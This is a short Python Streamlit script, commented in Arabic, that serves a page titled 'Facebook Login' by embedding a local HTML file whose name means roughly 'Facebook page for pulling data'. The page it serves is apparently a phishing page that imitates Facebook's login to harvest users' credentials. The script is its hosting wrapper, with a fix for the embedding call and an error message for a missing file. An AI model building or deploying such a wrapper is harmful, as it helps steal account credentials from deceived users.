import streamlit as st
import streamlit.components.v1 as components

# إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# محاولة قراءة الملف وعرضه
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        code = f.read()
    
    # التصحيح هنا: نمرر الكود مباشرة كأول "argument" بدون كلمة html_content
    components.html(code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ ملف الـ HTML غير موجود! تأكد أن اسمه مطابق تماماً لما هو مكتوب في الكود وارفعه بجانب ملف البايثون.")